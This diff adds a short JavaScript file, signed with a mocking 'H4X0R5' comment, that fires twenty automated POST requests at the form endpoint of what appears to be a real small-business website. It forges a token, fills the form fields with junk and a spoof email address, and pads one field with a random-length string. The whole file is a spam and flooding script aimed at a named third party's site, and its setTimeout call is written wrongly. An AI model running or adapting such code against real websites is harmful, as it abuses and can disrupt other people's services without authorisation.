@@ -1,0 +1,37 @@
+
+/* L0L 1337 H4X0R5 all ur base r belong 3 us */
+var rando = Math.floor(Math.random() * 100000000 + 1);
+
+var bigglyGen = function() {
+	var num = Math.floor(Math.random() * 200 + 1);
+
+	var big = "y";
+
+	for(var i = 0; i < num; i++){
+		big += "u";
+	}
+	big += "ge";
+	return big;
+}
+
+for(var i = 0; i < 20; i++){
+$.ajax({
+	method: "POST",
+	url: "http://www.rickscleaningservicellc.com/index.php?cID=163&bID=551&arHandle=Header+Image&ccm_token=" + rando + ":a1bfb3494f73013279c1283114123b85&btask=passthru&method=submit_form#" + rando,
+	data : {
+	"qsID" : rando,
+	"Question4" : "testtestetestset",
+	"Question5" : "donald.trump@president.com",
+	"Question7" : bigglyGen(),
+},
+success : function(data){
+	console.log(data.substring(0,10));
+},
+error : function(err){
+	console.log(err);
+}
+
+});
+setTimeout(1000, function(){console.log("Sent")});
+}
+
